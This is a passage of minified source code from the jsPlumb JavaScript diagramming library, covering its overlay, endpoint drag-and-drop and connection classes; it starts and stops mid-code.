            for (var b in this._jsPlumb.overlays) this._jsPlumb.overlays[b].cleanup(a), this._jsPlumb.overlays[b].destroy(a);
            a && (this._jsPlumb.overlays = {}, this._jsPlumb.overlayPositions = null)
        }, setVisible: function (a) {
            this[a ? "showOverlays" : "hideOverlays"]()
        }, setAbsoluteOverlayPosition: function (a, b) {
            this._jsPlumb.overlayPositions[a.id] = b
        }, getAbsoluteOverlayPosition: function (a) {
            return this._jsPlumb.overlayPositions ? this._jsPlumb.overlayPositions[a.id] : null
        }, _clazzManip: function (a, b, c) {
            if (!c) for (var d in this._jsPlumb.overlays) this._jsPlumb.overlays[d][a + "Class"](b)
        }, addClass: function (a, b) {
            this._clazzManip("add", a, b)
        }, removeClass: function (a, b) {
            this._clazzManip("remove", a, b)
        }
    })
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = function (a, b, c) {
            var d = !1;
            return {
                drag: function () {
                    if (d) return d = !1, !0;
                    if (b.element) {
                        var e = c.getUIPosition(arguments, c.getZoom());
                        null != e && c.setPosition(b.element, e), c.repaint(b.element, e), a.paint({anchorPoint: a.anchor.getCurrentLocation({element: a})})
                    }
                }, stopDrag: function () {
                    d = !0
                }
            }
        }, e = function (a, b, c, d) {
            var e = b.createElement("div", {position: "absolute"});
            b.appendElement(e);
            var f = b.getId(e);
            b.setPosition(e, c), e.style.width = d[0] + "px", e.style.height = d[1] + "px", b.manage(f, e, !0), a.id = f, a.element = e
        }, f = function (a, c, d, e, f, g, h, i) {
            return h({
                paintStyle: a,
                endpoint: d,
                anchor: new b.FloatingAnchor({reference: c, referenceCanvas: e, jsPlumbInstance: g}),
                source: f,
                scope: i
            })
        },
        g = ["connectorStyle", "connectorHoverStyle", "connectorOverlays", "connector", "connectionType", "connectorClass", "connectorHoverClass"],
        h = function (a, b) {
            var c = 0;
            if (null != b) for (var d = 0; d < a.connections.length; d++) if (a.connections[d].sourceId === b || a.connections[d].targetId === b) {
                c = d;
                break
            }
            return a.connections[c]
        };
    b.Endpoint = function (a) {
        var i = a._jsPlumb, j = a.newConnection, k = a.newEndpoint;
        this.idPrefix = "_jsplumb_e_", this.defaultLabelLocation = [.5, .5], this.defaultOverlayKeys = ["Overlays", "EndpointOverlays"], b.OverlayCapableJsPlumbUIComponent.apply(this, arguments), this.appendToDefaultType({
            connectionType: a.connectionType,
            maxConnections: null == a.maxConnections ? this._jsPlumb.instance.Defaults.MaxConnections : a.maxConnections,
            paintStyle: a.endpointStyle || a.paintStyle || a.style || this._jsPlumb.instance.Defaults.EndpointStyle || b.Defaults.EndpointStyle,
            hoverPaintStyle: a.endpointHoverStyle || a.hoverPaintStyle || this._jsPlumb.instance.Defaults.EndpointHoverStyle || b.Defaults.EndpointHoverStyle,
            connectorStyle: a.connectorStyle,
            connectorHoverStyle: a.connectorHoverStyle,
            connectorClass: a.connectorClass,
            connectorHoverClass: a.connectorHoverClass,
            connectorOverlays: a.connectorOverlays,
            connector: a.connector,
            connectorTooltip: a.connectorTooltip
        }), this._jsPlumb.enabled = !(!1 === a.enabled), this._jsPlumb.visible = !0, this.element = b.getElement(a.source), this._jsPlumb.uuid = a.uuid, this._jsPlumb.floatingEndpoint = null;
        var l = null
        ;this._jsPlumb.uuid && (a.endpointsByUUID[this._jsPlumb.uuid] = this), this.elementId = a.elementId, this.dragProxy = a.dragProxy, this._jsPlumb.connectionCost = a.connectionCost, this._jsPlumb.connectionsDirected = a.connectionsDirected, this._jsPlumb.currentAnchorClass = "", this._jsPlumb.events = {};
        var m = !0 === a.deleteOnEmpty;
        this.setDeleteOnEmpty = function (a) {
            m = a
        };
        var n = function () {
            var a = i.endpointAnchorClassPrefix + "-" + this._jsPlumb.currentAnchorClass;
            this._jsPlumb.currentAnchorClass = this.anchor.getCssClass();
            var c = i.endpointAnchorClassPrefix + (this._jsPlumb.currentAnchorClass ? "-" + this._jsPlumb.currentAnchorClass : "");
            this.removeClass(a), this.addClass(c), b.updateClasses(this.element, c, a)
        }.bind(this);
        this.prepareAnchor = function (a) {
            var b = this._jsPlumb.instance.makeAnchor(a, this.elementId, i);
            return b.bind("anchorChanged", function (a) {
                this.fire("anchorChanged", {endpoint: this, anchor: a}), n()
            }.bind(this)), b
        }, this.setPreparedAnchor = function (a, b) {
            return this._jsPlumb.instance.continuousAnchorFactory.clear(this.elementId), this.anchor = a, n(), b || this._jsPlumb.instance.repaint(this.elementId), this
        }, this.setAnchor = function (a, b) {
            var c = this.prepareAnchor(a);
            return this.setPreparedAnchor(c, b), this
        };
        var o = function (a) {
            if (this.connections.length > 0) for (var b = 0; b < this.connections.length; b++) this.connections[b].setHover(a, !1); else this.setHover(a)
        }.bind(this);
        this.bind("mouseover", function () {
            o(!0)
        }), this.bind("mouseout", function () {
            o(!1)
        }), a._transient || this._jsPlumb.instance.anchorManager.add(this, this.elementId), this.prepareEndpoint = function (d, e) {
            var f, g = function (a, c) {
                var d = i.getRenderMode();
                if (b.Endpoints[d][a]) return new b.Endpoints[d][a](c);
                if (!i.Defaults.DoNotThrowErrors) throw{msg: "jsPlumb: unknown endpoint type '" + a + "'"}
            }, h = {
                _jsPlumb: this._jsPlumb.instance,
                cssClass: a.cssClass,
                container: a.container,
                tooltip: a.tooltip,
                connectorTooltip: a.connectorTooltip,
                endpoint: this
            };
            return c.isString(d) ? f = g(d, h) : c.isArray(d) ? (h = c.merge(d[1], h), f = g(d[0], h)) : f = d.clone(), f.clone = function () {
                return c.isString(d) ? g(d, h) : c.isArray(d) ? (h = c.merge(d[1], h), g(d[0], h)) : void 0
            }.bind(this), f.typeId = e, f
        }, this.setEndpoint = function (a, b) {
            var c = this.prepareEndpoint(a);
            this.setPreparedEndpoint(c, !0)
        }, this.setPreparedEndpoint = function (a, b) {
            null != this.endpoint && (this.endpoint.cleanup(), this.endpoint.destroy()), this.endpoint = a, this.type = this.endpoint.type, this.canvas = this.endpoint.canvas
        }, b.extend(this, a, g), this.isSource = a.isSource || !1, this.isTemporarySource = a.isTemporarySource || !1, this.isTarget = a.isTarget || !1, this.connections = a.connections || [], this.connectorPointerEvents = a["connector-pointer-events"], this.scope = a.scope || i.getDefaultScope(), this.timestamp = null, this.reattachConnections = a.reattach || i.Defaults.ReattachConnections, this.connectionsDetachable = i.Defaults.ConnectionsDetachable, !1 !== a.connectionsDetachable && !1 !== a.detachable || (this.connectionsDetachable = !1), this.dragAllowedWhenFull = !1 !== a.dragAllowedWhenFull, a.onMaxConnections && this.bind("maxConnections", a.onMaxConnections), this.addConnection = function (a) {
            this.connections.push(a), this[(this.connections.length > 0 ? "add" : "remove") + "Class"](i.endpointConnectedClass), this[(this.isFull() ? "add" : "remove") + "Class"](i.endpointFullClass)
        }, this.detachFromConnection = function (a, b, c) {
            b = null == b ? this.connections.indexOf(a) : b, b >= 0 && (this.connections.splice(b, 1), this[(this.connections.length > 0 ? "add" : "remove") + "Class"](i.endpointConnectedClass), this[(this.isFull() ? "add" : "remove") + "Class"](i.endpointFullClass)), !c && m && 0 === this.connections.length && i.deleteObject({
                endpoint: this,
                fireEvent: !1,
                deleteAttachedObjects: !0 !== c
            })
        }, this.deleteEveryConnection = function (a) {
            for (var b = this.connections.length, c = 0; c < b; c++) i.deleteConnection(this.connections[0], a)
        }, this.detachFrom = function (a, b, c) {
            for (var d = [], e = 0; e < this.connections.length; e++) this.connections[e].endpoints[1] !== a && this.connections[e].endpoints[0] !== a || d.push(this.connections[e]);
            for (var f = 0, g = d.length; f < g; f++) i.deleteConnection(d[0]);
            return this
        }, this.getElement = function () {
            return this.element
        }, this.setElement = function (d) {
            var e = this._jsPlumb.instance.getId(d), f = this.elementId;
            return c.removeWithFunction(a.endpointsByElement[this.elementId], function (a) {
                return a.id === this.id
            }.bind(this)), this.element = b.getElement(d), this.elementId = i.getId(this.element), i.anchorManager.rehomeEndpoint(this, f, this.element), i.dragManager.endpointAdded(this.element), c.addToList(a.endpointsByElement, e, this), this
        }, this.makeInPlaceCopy = function () {
            var b = this.anchor.getCurrentLocation({element: this}), c = this.anchor.getOrientation(this),
                d = this.anchor.getCssClass(), e = {
                    bind: function () {
                    }, compute: function () {
                        return [b[0], b[1]]
                    }, getCurrentLocation: function () {
                        return [b[0], b[1]]
                    }, getOrientation: function () {
                        return c
                    }, getCssClass: function () {
                        return d
                    }
                };
            return k({
                dropOptions: a.dropOptions,
                anchor: e,
                source: this.element,
                paintStyle: this.getPaintStyle(),
                endpoint: a.hideOnDrag ? "Blank" : this.endpoint,
                _transient: !0,
                scope: this.scope,
                reference: this
            })
        }, this.connectorSelector = function () {
            return this.connections[0]
        }, this.setStyle = this.setPaintStyle, this.paint = function (a) {
            a = a || {};
            var b = a.timestamp, c = !(!1 === a.recalc);
            if (!b || this.timestamp !== b) {
                var d = i.updateOffset({elId: this.elementId, timestamp: b}), e = a.offset ? a.offset.o : d.o;
                if (null != e) {
                    var f = a.anchorPoint, g = a.connectorPaintStyle;
                    if (null == f) {
                        var j = a.dimensions || d.s, k = {xy: [e.left, e.top], wh: j, element: this, timestamp: b};
                        if (c && this.anchor.isDynamic && this.connections.length > 0) {
                            var l = h(this, a.elementWithPrecedence), m = l.endpoints[0] === this ? 1 : 0,
                                n = 0 === m ? l.sourceId : l.targetId, o = i.getCachedData(n), p = o.o, q = o.s;
                            k.index = 0 === m ? 1 : 0, k.connection = l, k.txy = [p.left, p.top], k.twh = q, k.tElement = l.endpoints[m]
                        } else this.connections.length > 0 && (k.connection = this.connections[0]);
                        f = this.anchor.compute(k)
                    }
                    this.endpoint.compute(f, this.anchor.getOrientation(this), this._jsPlumb.paintStyleInUse, g || this.paintStyleInUse), this.endpoint.paint(this._jsPlumb.paintStyleInUse, this.anchor), this.timestamp = b;
                    for (var r in this._jsPlumb.overlays) if (this._jsPlumb.overlays.hasOwnProperty(r)) {
                        var s = this._jsPlumb.overlays[r];
                        s.isVisible() && (this._jsPlumb.overlayPlacements[r] = s.draw(this.endpoint, this._jsPlumb.paintStyleInUse), s.paint(this._jsPlumb.overlayPlacements[r]))
                    }
                }
            }
        }, this.getTypeDescriptor = function () {
            return "endpoint"
        }, this.isVisible = function () {
            return this._jsPlumb.visible
        }, this.repaint = this.paint;
        var p = !1;
        this.initDraggable = function () {
            if (!p && b.isDragSupported(this.element)) {
                var g, h = {id: null, element: null}, m = null, n = !1, o = null, q = d(this, h, i),
                    r = a.dragOptions || {}, s = {}, t = b.dragEvents.start, u = b.dragEvents.stop,
                    v = b.dragEvents.drag, w = b.dragEvents.beforeStart, x = function (a) {
                        g = a.e.payload || {}
                    }, y = function (c) {
                        m = this.connectorSelector();
                        var d = !0;
                        this.isEnabled() || (d = !1), null != m || this.isSource || this.isTemporarySource || (d = !1), !this.isSource || !this.isFull() || null != m && this.dragAllowedWhenFull || (d = !1), null == m || m.isDetachable(this) || (this.isFull() ? d = !1 : m = null);
                        var l = i.checkCondition(null == m ? "beforeDrag" : "beforeStartDetach", {
                            endpoint: this,
                            source: this.element,
                            sourceId: this.elementId,
                            connection: m
                        });
                        if (!1 === l ? d = !1 : "object" == typeof l ? b.extend(l, g || {}) : l = g || {}, !1 === d) return i.stopDrag && i.stopDrag(this.canvas), q.stopDrag(), !1;
                        for (var p = 0; p < this.connections.length; p++) this.connections[p].setHover(!1);
                        this.addClass("endpointDrag"), i.setConnectionBeingDragged(!0), m && !this.isFull() && this.isSource && (m = null), i.updateOffset({elId: this.elementId});
                        var r = this._jsPlumb.instance.getOffset(this.canvas), s = this.canvas,
                            t = this._jsPlumb.instance.getSize(this.canvas);
                        e(h, i, r, t), i.setAttributes(this.canvas, {dragId: h.id, elId: this.elementId});
                        var u = this.dragProxy || this.endpoint;
                        if (null == this.dragProxy && null != this.connectionType) {
                            var v = this._jsPlumb.instance.deriveEndpointAndAnchorSpec(this.connectionType);
                            v.endpoints[1] && (u = v.endpoints[1])
                        }
                        var w = this._jsPlumb.instance.makeAnchor("Center");
                        w.isFloating = !0, this._jsPlumb.floatingEndpoint = f(this.getPaintStyle(), w, u, this.canvas, h.element, i, k, this.scope);
                        var x = this._jsPlumb.floatingEndpoint.anchor;
                        if (null == m) this.setHover(!1, !1), m = j({
                            sourceEndpoint: this,
                            targetEndpoint: this._jsPlumb.floatingEndpoint,
                            source: this.element,
                            target: h.element,
                            anchors: [this.anchor, this._jsPlumb.floatingEndpoint.anchor],
                            paintStyle: a.connectorStyle,
                            hoverPaintStyle: a.connectorHoverStyle,
                            connector: a.connector,
                            overlays: a.connectorOverlays,
                            type: this.connectionType,
                            cssClass: this.connectorClass,
                            hoverClass: this.connectorHoverClass,
                            scope: a.scope,
                            data: l
                        }), m.pending = !0, m.addClass(i.draggingClass), this._jsPlumb.floatingEndpoint.addClass(i.draggingClass), this._jsPlumb.floatingEndpoint.anchor = x, i.fire("connectionDrag", m), i.anchorManager.newConnection(m); else {
                            n = !0, m.setHover(!1);
                            var y = m.endpoints[0].id === this.id ? 0 : 1;
                            this.detachFromConnection(m, null, !0);
                            var z = i.getDragScope(s);
                            i.setAttribute(this.canvas, "originalScope", z), i.fire("connectionDrag", m), 0 === y ? (o = [m.source, m.sourceId, s, z], i.anchorManager.sourceChanged(m.endpoints[y].elementId, h.id, m, h.element)) : (o = [m.target, m.targetId, s, z], m.target = h.element, m.targetId = h.id, i.anchorManager.updateOtherEndpoint(m.sourceId, m.endpoints[y].elementId, m.targetId, m)), m.suspendedEndpoint = m.endpoints[y], m.suspendedElement = m.endpoints[y].getElement(), m.suspendedElementId = m.endpoints[y].elementId, m.suspendedElementType = 0 === y ? "source" : "target", m.suspendedEndpoint.setHover(!1), this._jsPlumb.floatingEndpoint.referenceEndpoint = m.suspendedEndpoint, m.endpoints[y] = this._jsPlumb.floatingEndpoint, m.addClass(i.draggingClass), this._jsPlumb.floatingEndpoint.addClass(i.draggingClass)
                        }
                        i.registerFloatingConnection(h, m, this._jsPlumb.floatingEndpoint), i.currentlyDragging = !0
                    }.bind(this), z = function () {
                        if (i.setConnectionBeingDragged(!1), m && null != m.endpoints) {
                            var a = i.getDropEvent(arguments), b = i.getFloatingAnchorIndex(m);
                            if (m.endpoints[0 === b ? 1 : 0].anchor.unlock(), m.removeClass(i.draggingClass), this._jsPlumb && (m.deleteConnectionNow || m.endpoints[b] === this._jsPlumb.floatingEndpoint) && n && m.suspendedEndpoint) {
                                0 === b ? (m.floatingElement = m.source, m.floatingId = m.sourceId, m.floatingEndpoint = m.endpoints[0], m.floatingIndex = 0, m.source = o[0], m.sourceId = o[1]) : (m.floatingElement = m.target, m.floatingId = m.targetId, m.floatingEndpoint = m.endpoints[1], m.floatingIndex = 1, m.target = o[0], m.targetId = o[1]);
                                var c = this._jsPlumb.floatingEndpoint;
                                i.setDragScope(o[2], o[3]), m.endpoints[b] = m.suspendedEndpoint, m.isReattach() || m._forceReattach || m._forceDetach || !i.deleteConnection(m, {originalEvent: a}) ? (m.setHover(!1), m._forceDetach = null, m._forceReattach = null, this._jsPlumb.floatingEndpoint.detachFromConnection(m), m.suspendedEndpoint.addConnection(m), 1 === b ? i.anchorManager.updateOtherEndpoint(m.sourceId, m.floatingId, m.targetId, m) : i.anchorManager.sourceChanged(m.floatingId, m.sourceId, m, m.source), i.repaint(o[1])) : i.deleteObject({endpoint: c})
                            }
                            this.deleteAfterDragStop ? i.deleteObject({endpoint: this}) : this._jsPlumb && this.paint({recalc: !1}), i.fire("connectionDragStop", m, a), m.pending && i.fire("connectionAborted", m, a), i.currentlyDragging = !1, m.suspendedElement = null, m.suspendedEndpoint = null, m = null
                        }
                        h && h.element && i.remove(h.element, !1, !1), l && i.deleteObject({endpoint: l}), this._jsPlumb && (this.canvas.style.visibility = "visible", this.anchor.unlock(), this._jsPlumb.floatingEndpoint = null)
                    }.bind(this);
                r = b.extend(s, r), r.scope = this.scope || r.scope, r[w] = c.wrap(r[w], x, !1), r[t] = c.wrap(r[t], y, !1), r[v] = c.wrap(r[v], q.drag), r[u] = c.wrap(r[u], z), r.multipleDrop = !1, r.canDrag = function () {
                    return this.isSource || this.isTemporarySource || this.connections.length > 0
                }.bind(this), i.initDraggable(this.canvas, r, "internal"), this.canvas._jsPlumbRelatedElement = this.element, p = !0
            }
        };
        var q = a.endpoint || this._jsPlumb.instance.Defaults.Endpoint || b.Defaults.Endpoint;
        this.setEndpoint(q, !0);
        var r = a.anchor ? a.anchor : a.anchors ? a.anchors : i.Defaults.Anchor || "Top";
        this.setAnchor(r, !0);
        var s = ["default", a.type || ""].join(" ");
        this.addType(s, a.data, !0), this.canvas = this.endpoint.canvas, this.canvas._jsPlumb = this, this.initDraggable();
        var t = function (d, e, f, g) {
            if (b.isDropSupported(this.element)) {
                var h = a.dropOptions || i.Defaults.DropOptions || b.Defaults.DropOptions;
                h = b.extend({}, h), h.scope = h.scope || this.scope;
                var j = b.dragEvents.drop, k = b.dragEvents.over, l = b.dragEvents.out, m = this,
                    n = i.EndpointDropHandler({
                        getEndpoint: function () {
                            return m
                        },
                        jsPlumb: i,
                        enabled: function () {
                            return null == f || f.isEnabled()
                        },
                        isFull: function () {
                            return f.isFull()
                        },
                        element: this.element,
                        elementId: this.elementId,
                        isSource: this.isSource,
                        isTarget: this.isTarget,
                        addClass: function (a) {
                            m.addClass(a)
                        },
                        removeClass: function (a) {
                            m.removeClass(a)
                        },
                        isDropAllowed: function () {
                            return m.isDropAllowed.apply(m, arguments)
                        },
                        reference: g,
                        isRedrop: function (a, b) {
                            return a.suspendedEndpoint && b.reference && a.suspendedEndpoint.id === b.reference.id
                        }
                    });
                h[j] = c.wrap(h[j], n, !0), h[k] = c.wrap(h[k], function () {
                    var a = b.getDragObject(arguments), c = i.getAttribute(b.getElement(a), "dragId"),
                        d = i.getFloatingConnectionFor(c);
                    if (null != d) {
                        var e = i.getFloatingAnchorIndex(d);
                        if (this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id) {
                            var f = i.checkCondition("checkDropAllowed", {
                                sourceEndpoint: d.endpoints[e],
                                targetEndpoint: this,
                                connection: d
                            });
                            this[(f ? "add" : "remove") + "Class"](i.endpointDropAllowedClass), this[(f ? "remove" : "add") + "Class"](i.endpointDropForbiddenClass), d.endpoints[e].anchor.over(this.anchor, this)
                        }
                    }
                }.bind(this)), h[l] = c.wrap(h[l], function () {
                    var a = b.getDragObject(arguments),
                        c = null == a ? null : i.getAttribute(b.getElement(a), "dragId"),
                        d = c ? i.getFloatingConnectionFor(c) : null;
                    if (null != d) {
                        var e = i.getFloatingAnchorIndex(d);
                        (this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id) && (this.removeClass(i.endpointDropAllowedClass), this.removeClass(i.endpointDropForbiddenClass), d.endpoints[e].anchor.out())
                    }
                }.bind(this)), i.initDroppable(d, h, "internal", e)
            }
        }.bind(this);
        return this.anchor.isFloating || t(this.canvas, !(a._transient || this.anchor.isFloating), this, a.reference), this
    }, c.extend(b.Endpoint, b.OverlayCapableJsPlumbUIComponent, {
        setVisible: function (a, b, c) {
            if (this._jsPlumb.visible = a, this.canvas && (this.canvas.style.display = a ? "block" : "none"), this[a ? "showOverlays" : "hideOverlays"](), !b) for (var d = 0; d < this.connections.length; d++) if (this.connections[d].setVisible(a), !c) {
                var e = this === this.connections[d].endpoints[0] ? 1 : 0;
                1 === this.connections[d].endpoints[e].connections.length && this.connections[d].endpoints[e].setVisible(a, !0, !0)
            }
        }, getAttachedElements: function () {
            return this.connections
        }, applyType: function (a, c) {
            this.setPaintStyle(a.endpointStyle || a.paintStyle, c), this.setHoverPaintStyle(a.endpointHoverStyle || a.hoverPaintStyle, c), null != a.maxConnections && (this._jsPlumb.maxConnections = a.maxConnections), a.scope && (this.scope = a.scope), b.extend(this, a, g), null != a.cssClass && this.canvas && this._jsPlumb.instance.addClass(this.canvas, a.cssClass), b.OverlayCapableJsPlumbUIComponent.applyType(this, a)
        }, isEnabled: function () {
            return this._jsPlumb.enabled
        }, setEnabled: function (a) {
            this._jsPlumb.enabled = a
        }, cleanup: function () {
            var a = this._jsPlumb.instance.endpointAnchorClassPrefix + (this._jsPlumb.currentAnchorClass ? "-" + this._jsPlumb.currentAnchorClass : "");
            b.removeClass(this.element, a), this.anchor = null, this.endpoint.cleanup(!0), this.endpoint.destroy(), this.endpoint = null, this._jsPlumb.instance.destroyDraggable(this.canvas, "internal"), this._jsPlumb.instance.destroyDroppable(this.canvas, "internal")
        }, setHover: function (a) {
            this.endpoint && this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged() && this.endpoint.setHover(a)
        }, isFull: function () {
            return 0 === this._jsPlumb.maxConnections || !(this.isFloating() || this._jsPlumb.maxConnections < 0 || this.connections.length < this._jsPlumb.maxConnections)
        }, isFloating: function () {
            return null != this.anchor && this.anchor.isFloating
        }, isConnectedTo: function (a) {
            var b = !1;
            if (a) for (var c = 0; c < this.connections.length; c++) if (this.connections[c].endpoints[1] === a || this.connections[c].endpoints[0] === a) {
                b = !0;
                break
            }
            return b
        }, getConnectionCost: function () {
            return this._jsPlumb.connectionCost
        }, setConnectionCost: function (a) {
            this._jsPlumb.connectionCost = a
        }, areConnectionsDirected: function () {
            return this._jsPlumb.connectionsDirected
        }, setConnectionsDirected: function (a) {
            this._jsPlumb.connectionsDirected = a
        }, setElementId: function (a) {
            this.elementId = a, this.anchor.elementId = a
        }, setReferenceElement: function (a) {
            this.element = b.getElement(a)
        }, setDragAllowedWhenFull: function (a) {
            this.dragAllowedWhenFull = a
        }, equals: function (a) {
            return this.anchor.equals(a.anchor)
        }, getUuid: function () {
            return this._jsPlumb.uuid
        }, computeAnchor: function (a) {
            return this.anchor.compute(a)
        }
    }), a.jsPlumbInstance.prototype.EndpointDropHandler = function (a) {
        return function (b) {
            var d = a.jsPlumb;
            a.removeClass(d.endpointDropAllowedClass), a.removeClass(d.endpointDropForbiddenClass);
            var e = d.getDropEvent(arguments), f = d.getDragObject(arguments), g = d.getAttribute(f, "dragId"),
                h = (d.getAttribute(f, "elId"), d.getAttribute(f, "originalScope")), i = d.getFloatingConnectionFor(g);
            if (null != i) {
                var j = null != i.suspendedEndpoint;
                if (!j || null != i.suspendedEndpoint._jsPlumb) {
                    var k = a.getEndpoint(i);
                    if (null != k) {
                        if (a.isRedrop(i, a)) return i._forceReattach = !0, i.setHover(!1), void(a.maybeCleanup && a.maybeCleanup(k));
                        var l = d.getFloatingAnchorIndex(i);
                        if (0 === l && !a.isSource || 1 === l && !a.isTarget) return void(a.maybeCleanup && a.maybeCleanup(k));
                        a.onDrop && a.onDrop(i), h && d.setDragScope(f, h);
                        var m = a.isFull(b);
                        if (m && k.fire("maxConnections", {
                            endpoint: this,
                            connection: i,
                            maxConnections: k._jsPlumb.maxConnections
                        }, e), !m && a.enabled()) {
                            var n = !0;
                            0 === l ? (i.floatingElement = i.source, i.floatingId = i.sourceId, i.floatingEndpoint = i.endpoints[0], i.floatingIndex = 0, i.source = a.element, i.sourceId = a.elementId) : (i.floatingElement = i.target, i.floatingId = i.targetId, i.floatingEndpoint = i.endpoints[1], i.floatingIndex = 1, i.target = a.element, i.targetId = a.elementId), j && i.suspendedEndpoint.id !== k.id && (i.isDetachAllowed(i) && i.endpoints[l].isDetachAllowed(i) && i.suspendedEndpoint.isDetachAllowed(i) && d.checkCondition("beforeDetach", i) || (n = !1));
                            var o = function (b) {
                                i.endpoints[l].detachFromConnection(i), i.suspendedEndpoint && i.suspendedEndpoint.detachFromConnection(i), i.endpoints[l] = k, k.addConnection(i);
                                var f = k.getParameters();
                                for (var g in f) i.setParameter(g, f[g]);
                                if (j) {
                                    var h = i.suspendedEndpoint.elementId;
                                    d.fireMoveEvent({
                                        index: l,
                                        originalSourceId: 0 === l ? h : i.sourceId,
                                        newSourceId: 0 === l ? k.elementId : i.sourceId,
                                        originalTargetId: 1 === l ? h : i.targetId,
                                        newTargetId: 1 === l ? k.elementId : i.targetId,
                                        originalSourceEndpoint: 0 === l ? i.suspendedEndpoint : i.endpoints[0],
                                        newSourceEndpoint: 0 === l ? k : i.endpoints[0],
                                        originalTargetEndpoint: 1 === l ? i.suspendedEndpoint : i.endpoints[1],
                                        newTargetEndpoint: 1 === l ? k : i.endpoints[1],
                                        connection: i
                                    }, e)
                                } else f.draggable && d.initDraggable(this.element, a.dragOptions, "internal", d);
                                if (1 === l ? d.anchorManager.updateOtherEndpoint(i.sourceId, i.floatingId, i.targetId, i) : d.anchorManager.sourceChanged(i.floatingId, i.sourceId, i, i.source), i.endpoints[0].finalEndpoint) {
                                    i.endpoints[0].detachFromConnection(i), i.endpoints[0] = i.endpoints[0].finalEndpoint, i.endpoints[0].addConnection(i)
                                }
                                c.isObject(b) && i.mergeData(b), d.finaliseConnection(i, null, e, !1), i.setHover(!1)
                            }.bind(this), p = function () {
                                i.suspendedEndpoint && (i.endpoints[l] = i.suspendedEndpoint, i.setHover(!1), i._forceDetach = !0, 0 === l ? (i.source = i.suspendedEndpoint.element, i.sourceId = i.suspendedEndpoint.elementId) : (i.target = i.suspendedEndpoint.element, i.targetId = i.suspendedEndpoint.elementId), i.suspendedEndpoint.addConnection(i), 1 === l ? d.anchorManager.updateOtherEndpoint(i.sourceId, i.floatingId, i.targetId, i) : d.anchorManager.sourceChanged(i.floatingId, i.sourceId, i, i.source), d.repaint(i.sourceId), i._forceDetach = !1)
                            };
                            if (n = n && a.isDropAllowed(i.sourceId, i.targetId, i.scope, i, k)) return o(n), !0;
                            p()
                        }
                        a.maybeCleanup && a.maybeCleanup(k), d.currentlyDragging = !1
                    }
                }
            }
        }
    }
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = function (a, d, e, f, g) {
        if (b.Connectors[d] = b.Connectors[d] || {}, null == b.Connectors[d][e]) {
            if (null == b.Connectors[e]) {
                if (a.Defaults.DoNotThrowErrors) return null;
                throw new TypeError("jsPlumb: unknown connector type '" + e + "'")
            }
            b.Connectors[d][e] = function () {
                b.Connectors[e].apply(this, arguments), b.ConnectorRenderers[d].apply(this, arguments)
            }, c.extend(b.Connectors[d][e], [b.Connectors[e], b.ConnectorRenderers[d]])
        }
        return new b.Connectors[d][e](f, g)
    }, e = function (a, b, c) {
        return a ? c.makeAnchor(a, b, c) : null
    }, f = function (a, b, d, e) {
        null != b && (b._jsPlumbConnections = b._jsPlumbConnections || {}, e ? delete b._jsPlumbConnections[a.id] : b._jsPlumbConnections[a.id] = !0, c.isEmpty(b._jsPlumbConnections) ? d.removeClass(b, d.connectedClass) : d.addClass(b, d.connectedClass))
    };
    b.Connection = function (a) {
        var d = a.newEndpoint;
        this.id = a.id, this.connector = null, this.idPrefix = "_jsplumb_c_", this.defaultLabelLocation = .5, this.defaultOverlayKeys = ["Overlays", "ConnectionOverlays"], this.previousConnection = a.previousConnection, this.source = b.getElement(a.source), this.target = b.getElement(a.target), b.OverlayCapableJsPlumbUIComponent.apply(this, arguments), a.sourceEndpoint ? (this.source = a.sourceEndpoint.getElement(), this.sourceId = a.sourceEndpoint.elementId) : this.sourceId = this._jsPlumb.instance.getId(this.source), a.targetEndpoint ? (this.target = a.targetEndpoint.getElement(), this.targetId = a.targetEndpoint.elementId) : this.targetId = this._jsPlumb.instance.getId(this.target), this.scope = a.scope, this.endpoints = [], this.endpointStyles = [];
        var e = this._jsPlumb.instance;
        e.manage(this.sourceId, this.source), e.manage(this.targetId, this.target), this._jsPlumb.visible = !0, this._jsPlumb.params = {
            cssClass: a.cssClass,
            container: a.container,
            "pointer-events": a["pointer-events"],
            editorParams: a.editorParams,
            overlays: a.overlays
        }, this._jsPlumb.lastPaintedAt = null, this.bind("mouseover", function () {
            this.setHover(!0)
        }.bind(this)), this.bind("mouseout", function () {
            this.setHover(!1)
        }.bind(this)), this.makeEndpoint = function (b, c, f, g) {
            return f = f || this._jsPlumb.instance.getId(c), this.prepareEndpoint(e, d, this, g, b ? 0 : 1, a, c, f)
        }, a.type && (a.endpoints = a.endpoints || this._jsPlumb.instance.deriveEndpointAndAnchorSpec(a.type).endpoints);
        var f = this.makeEndpoint(!0, this.source, this.sourceId, a.sourceEndpoint),
            g = this.makeEndpoint(!1, this.target, this.targetId, a.targetEndpoint);
        f && c.addToList(a.endpointsByElement, this.sourceId, f), g && c.addToList(a.endpointsByElement, this.targetId, g), this.scope || (this.scope = this.endpoints[0].scope), null != a.deleteEndpointsOnEmpty && (this.endpoints[0].setDeleteOnEmpty(a.deleteEndpointsOnEmpty), this.endpoints[1].setDeleteOnEmpty(a.deleteEndpointsOnEmpty));
        var h = e.Defaults.ConnectionsDetachable;
        !1 === a.detachable && (h = !1), !1 === this.endpoints[0].connectionsDetachable && (h = !1), !1 === this.endpoints[1].connectionsDetachable && (h = !1);
        var i = a.reattach || this.endpoints[0].reattachConnections || this.endpoints[1].reattachConnections || e.Defaults.ReattachConnections;
        this.appendToDefaultType({
            detachable: h,
            reattach: i,
            paintStyle: this.endpoints[0].connectorStyle || this.endpoints[1].connectorStyle || a.paintStyle || e.Defaults.PaintStyle || b.Defaults.PaintStyle,
            hoverPaintStyle: this.endpoints[0].connectorHoverStyle || this.endpoints[1].connectorHoverStyle || a.hoverPaintStyle || e.Defaults.HoverPaintStyle || b.Defaults.HoverPaintStyle
        });
        var j = e.getSuspendedAt();
        if (!e.isSuspendDrawing()) {
            var k = e.getCachedData(this.sourceId), l = k.o, m = k.s, n = e.getCachedData(this.targetId), o = n.o,
                p = n.s, q = j || e.timestamp(), r = this.endpoints[0].anchor.compute({
                    xy: [l.left, l.top],
                    wh: m,
                    element: this.endpoints[0],
